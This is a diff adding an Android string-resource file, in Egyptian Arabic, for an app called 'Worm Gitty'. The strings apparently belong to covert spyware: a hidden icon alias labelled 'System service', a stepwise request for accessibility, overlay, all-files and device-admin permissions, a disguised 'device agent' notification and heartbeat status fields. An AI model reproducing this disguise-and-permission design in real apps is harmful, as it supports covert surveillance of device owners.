@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Worm Gitty</string>
+    <string name="alias_hidden_label">خدمة النظام</string>
+    <string name="status_title">حالة الجهاز</string>
+    <string name="welcome_line1">أهلاً بيك</string>
+    <string name="welcome_line2">هناخد دقيقة واحدة بس</string>
+    <string name="btn_next">التالي</string>
+    <string name="name_hint">اسمك</string>
+    <string name="name_error">الاسم لازم يكون من ٢ لـ ٤٠ حرف</string>
+    <string name="phone_hint">رقم الموبايل</string>
+    <string name="phone_error">الرقم غير صحيح</string>
+    <string name="lock_btn">قفل</string>
+    <string name="summary_title">ملخص التسجيل</string>
+    <string name="step_checklist_title">فوّض الصلاحيات دي واحد واحد</string>
+    <string name="perm_overlay">الظهور فوق التطبيقات</string>
+    <string name="perm_accessibility">إمكانية الوصول</string>
+    <string name="perm_all_files">كل الملفات</string>
+    <string name="perm_battery_opt">تجاهل تحسين البطارية</string>
+    <string name="perm_device_admin">مسؤول الجهاز</string>
+    <string name="perm_notifications">الإشعارات</string>
+    <string name="notif_channel_name">وكيل الجهاز</string>
+    <string name="notif_service_text">خدمة النظام شغالة</string>
+    <string name="status_alias_state">حالة الأيقونة</string>
+    <string name="status_service_alive">الخدمة شغالة</string>
+    <string name="status_last_heartbeat">آخر نبضة</string>
+    <string name="status_phone">الموبايل</string>
+</resources>
